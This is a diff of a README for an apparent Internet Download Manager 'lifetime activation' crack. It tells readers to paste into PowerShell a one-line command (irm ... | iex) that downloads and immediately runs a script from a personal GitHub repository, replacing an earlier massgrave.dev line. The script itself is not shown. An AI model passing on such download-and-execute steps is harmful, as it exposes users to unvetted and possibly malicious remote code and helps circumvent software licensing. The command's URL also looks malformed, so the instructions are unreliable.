@@ -1,10 +1,14 @@
-Activate IDM for Lifetime: The fastest download accelerator.
+# IDM Activation Script - Lifetime Activation
 
-Method 1 - PowerShell (Recommended)
-Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
+Welcome to the **IDM Activation Script** repository! This script allows you to activate Internet Download Manager (IDM) for lifetime usage. Follow the simple steps below to activate your IDM quickly.
 
-Copy and paste the code below and press enter:
+## Method 1 - PowerShell (Recommended)
 
-irm https://massgrave.dev/ias | iex
-irm https://massgrave.dev/get | iex
-Follow the on-screen instructions for activation.
+1. **Open PowerShell or Terminal**:
+   - Right-click on the Windows Start Menu and select **PowerShell** or **Terminal** (not CMD).
+
+2. **Run the Activation Script**:
+   Copy and paste the code below into PowerShell and press **Enter**:
+
+   ```powershell
+   irm https://github.com/sadmanadib33/IDM_Activation_hawkeye/activate.ps1 | iex
